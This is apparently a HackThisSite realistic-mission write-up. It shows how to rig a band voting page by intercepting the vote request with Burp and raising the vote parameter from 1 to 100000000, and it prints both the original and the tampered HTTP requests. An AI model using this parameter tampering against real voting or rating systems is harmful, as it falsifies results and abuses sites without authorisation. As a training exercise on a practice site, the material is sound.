# Uncle Arnold's Local Band Review
From: HeavyMetalRyan

Message: Hey man, I need a big favour from you. Remember that website I showed you once before? Uncle Arnold's Band Review Page? Well, a long time ago I made a $500 bet with a friend that my band would be at the top of the list by the end of the year. Well, as you already know, two of my band members have died in a horrendous car accident... but this ass hole still insists that the bet is on!
I know you're good with computers and stuff, so I was wondering, is there any way for you to hack this website and make my band on the top of the list? My band is Raging Inferno. Thanks a lot, man!

So when we view the web page : https://www.hackthissite.org/missions/realistic/1/

we will see that **Raging Inferno** is at the end of the list we need it to be on top 

by intercepting data using **Burp** we can find out that the request is sent with **vote value** as shown

```html
GET /missions/realistic/1/v.php?PHPSESSID=abcaeadfc31a5c43b2534bf995c0553f&id=3&vote=1 HTTP/1.1
Host: www.hackthissite.org
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:58.0) Gecko/20100101 Firefox/58.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Referer: https://www.hackthissite.org/missions/realistic/1/
Cookie: _pk_id.1.1039=698497548ef239b8.1520769090.2.1520861954.1520861653.; PHPSESSID=picgn6dtvjl7hki6kkp3ukind6
DNT: 1
Connection: close
Upgrade-Insecure-Requests: 1
```
so we have can intercept the vote value and change it to **100000000 or any big number** should do the trick of pushing **Raging Inferno** to top just like the one below

```html
GET /missions/realistic/1/v.php?PHPSESSID=abcaeadfc31a5c43b2534bf995c0553f&id=3&vote=100000000 HTTP/1.1
Host: www.hackthissite.org
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:58.0) Gecko/20100101 Firefox/58.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Referer: https://www.hackthissite.org/missions/realistic/1/
Cookie: _pk_id.1.1039=698497548ef239b8.1520769090.2.1520861954.1520861653.; PHPSESSID=picgn6dtvjl7hki6kkp3ukind6
DNT: 1
Connection: close
Upgrade-Insecure-Requests: 1
```

By Forwarding the header mentioned above we will be redirected to Hackthissite main page and the challenge is completed :D 

### Happy Hacking
